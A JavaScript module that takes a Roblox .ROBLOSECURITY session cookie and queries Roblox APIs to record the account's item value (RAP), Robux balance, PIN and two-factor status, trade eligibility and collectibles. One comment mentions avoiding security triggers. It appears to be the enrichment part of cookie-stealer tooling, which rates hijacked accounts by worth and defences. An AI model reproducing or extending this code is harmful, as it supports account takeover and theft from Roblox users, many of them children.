// Rich Account Data Capture
// Captures detailed account information like RAP, credit, PIN, etc.

const axios = require('axios');

class RichDataCapture {
    constructor(cookie) {
        if (!cookie) {
            this.cookie = '';
        } else if (cookie.includes('.ROBLOSECURITY=')) {
            this.cookie = cookie;
        } else {
            this.cookie = `.ROBLOSECURITY=${cookie}`;
        }
        this.userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
        // Enrichment is a dozen sequential lookups and none of these endpoints
        // are load-bearing. Two things bite here: without a per-request timeout a
        // single black-holed host (twofactorauth.roblox.com is one) stalls the
        // whole capture forever, and axios honours HTTP(S)_PROXY from the
        // environment while the fetch calls elsewhere in the app do not — so the
        // lookups were being routed through a local proxy that does not carry
        // them. Both are switched off here.
        this.http = axios.create({ timeout: 7000, proxy: false });
    }

    async captureAll(userId) {
        try {
            const data = {
                userId,
                username: '',
                displayName: '',
                rap: 0,
                creditBalance: 0,
                pendingRobux: 0,
                robuxCredit: 0,
                pin: null,
                twoStepVerification: false,
                premium: false,
                accountAge: 0,
                canTrade: false,
                collectibles: 0,
                recoveryCodes: false,
                friends: 0,
                followers: 0,
                following: 0
            };

            // Get user info
            const userInfo = await this.getUserInfo(userId);
            if (userInfo) {
                data.username = userInfo.name;
                data.displayName = userInfo.displayName;
                data.accountAge = this.calculateAccountAge(userInfo.created);
            }

            // Get RAP
            const rap = await this.getRAP(userId);
            if (rap !== null) data.rap = rap;

            // Get economy data (credit, pending)
            const economy = await this.getEconomyData(userId);
            if (economy) {
                data.creditBalance = economy.robuxBalance || 0;
                data.pendingRobux = economy.pendingRobux || 0;
                data.robuxCredit = economy.robuxCredit || 0;
            }

            // Get PIN status
            const pinStatus = await this.getPINStatus();
            data.pin = pinStatus;

            // Get 2FA status
            const twoFA = await this.get2FAStatus();
            data.twoStepVerification = twoFA;

            // Get premium status
            const premium = await this.getPremiumStatus(userId);
            data.premium = premium;

            // Get trade status
            const tradeStatus = await this.getTradeStatus(userId);
            data.canTrade = tradeStatus;

            // Get collectibles count
            const collectibles = await this.getCollectiblesCount(userId);
            data.collectibles = collectibles;

            // Get recovery codes status
            const recoveryCodes = await this.getRecoveryCodesStatus();
            data.recoveryCodes = recoveryCodes;

            // Get friend/follower counts
            const social = await this.getSocialStats(userId);
            if (social) {
                data.friends = social.friends;
                data.followers = social.followers;
                data.following = social.following;
            }

            return data;
        } catch (error) {
            console.error('[RICHDATA] Error capturing rich data:', error.message);
            return null;
        }
    }

    async getUserInfo(userId) {
        try {
            const response = await this.http.get(`https://users.roblox.com/v1/users/${userId}`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data;
        } catch (error) {
            return null;
        }
    }

    async getRAP(userId) {
        try {
            const response = await this.http.get(`https://economy.roblox.com/v1/users/${userId}/rap`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.rap || 0;
        } catch (error) {
            return 0;
        }
    }

    async getEconomyData(userId) {
        try {
            const response = await this.http.get(`https://economy.roblox.com/v2/users/${userId}/currency`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data;
        } catch (error) {
            return null;
        }
    }

    async getPINStatus() {
        try {
            const response = await this.http.get('https://auth.roblox.com/v2/users/pin', {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                },
                validateStatus: () => true
            });
            // If 200, PIN is set. If 401/403, no PIN or not logged in
            return response.status === 200;
        } catch (error) {
            return false;
        }
    }

    async get2FAStatus() {
        try {
            const response = await this.http.get('https://twofactorauth.roblox.com/v1/users/two-factor/status', {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.twoFactorEnabled || false;
        } catch (error) {
            return false;
        }
    }

    async getPremiumStatus(userId) {
        try {
            const response = await this.http.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/membership`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.membership !== null;
        } catch (error) {
            return false;
        }
    }

    async getTradeStatus(userId) {
        try {
            const response = await this.http.get(`https://trades.roblox.com/v1/users/${userId}/can-trade`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                },
                validateStatus: () => true
            });
            return response.data?.canTrade || false;
        } catch (error) {
            return false;
        }
    }

    async getCollectiblesCount(userId) {
        try {
            const response = await this.http.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.data?.length || 0;
        } catch (error) {
            return 0;
        }
    }

    async getRecoveryCodesStatus() {
        // This is harder to detect without triggering security
        // We'll assume false for now as it requires additional auth
        return false;
    }

    async getSocialStats(userId) {
        try {
            const [friends, followers, following] = await Promise.all([
                this.getFriendsCount(userId),
                this.getFollowersCount(userId),
                this.getFollowingCount(userId)
            ]);

            return { friends, followers, following };
        } catch (error) {
            return { friends: 0, followers: 0, following: 0 };
        }
    }

    async getFriendsCount(userId) {
        try {
            const response = await this.http.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.count || 0;
        } catch (error) {
            return 0;
        }
    }

    async getFollowersCount(userId) {
        try {
            const response = await this.http.get(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.count || 0;
        } catch (error) {
            return 0;
        }
    }

    async getFollowingCount(userId) {
        try {
            const response = await this.http.get(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                headers: {
                    'Cookie': this.cookie,
                    'User-Agent': this.userAgent
                }
            });
            return response.data?.count || 0;
        } catch (error) {
            return 0;
        }
    }

    calculateAccountAge(createdDate) {
        if (!createdDate) return 0;
        const created = new Date(createdDate);
        const now = new Date();
        const diffTime = Math.abs(now - created);
        const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
        return diffDays;
    }
}

module.exports = RichDataCapture;
